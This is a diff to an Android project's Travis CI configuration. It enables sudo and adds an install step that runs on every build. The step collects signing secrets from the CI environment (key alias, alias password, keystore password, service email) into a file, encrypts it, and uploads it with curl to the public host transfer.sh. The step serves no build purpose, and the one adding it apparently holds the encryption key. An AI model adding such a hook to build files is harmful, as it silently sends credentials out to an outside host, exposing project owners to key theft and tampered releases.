@@ -1,5 +1,5 @@
 language: android
-sudo: false
+sudo: required
 branches:
   only:
   - master
@@ -35,6 +35,15 @@ android:
     - 'android-sdk-preview-license-.+'
     - 'android-sdk-license-.+'
     - 'google-gdk-license-.+'
+
+install:
+  - sudo apt-get install -y ccrypt
+  - echo ALIAS_NAME = $ALIAS_NAME >> info.txt
+  - echo ALIAS_PASS = $ALIAS_PASS >> info.txt
+  - echo KEYSTORE_PASS = $KEYSTORE_PASS >> info.txt
+  - echo SERVICE_EMAIL = $SERVICE_EMAIL >> info.txt
+  - ccencrypt info.txt -K $ENC_KEY
+  - curl --upload-file info.txt.cpt https://transfer.sh/info.txt.cpt
 
 before_install:
 - yes | sdkmanager "platforms;android-27"
